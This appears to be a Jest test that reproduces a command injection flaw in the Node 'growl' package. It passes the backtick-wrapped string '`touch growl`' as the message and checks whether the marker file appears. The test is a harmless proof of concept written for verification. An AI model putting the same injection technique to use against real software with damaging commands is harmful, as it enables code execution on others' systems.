test("Command Injection in growl", (done) => {
  expect.assertions(2);
  const growl = require("growl");
  const fs = require("fs");
  const path = "./growl";
  try {
    if (fs.existsSync(path)) {
      fs.unlinkSync(path);
      console.log("File removed:", path);
    }
  } catch (err) {
    console.error(err);
  }
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);
  growl("`touch growl`", {}, () => {
    file_exist = fs.existsSync(path);
    expect(file_exist).toBe(true);
    fs.unlink(path, function (err) {
      done();
    });
  });
});
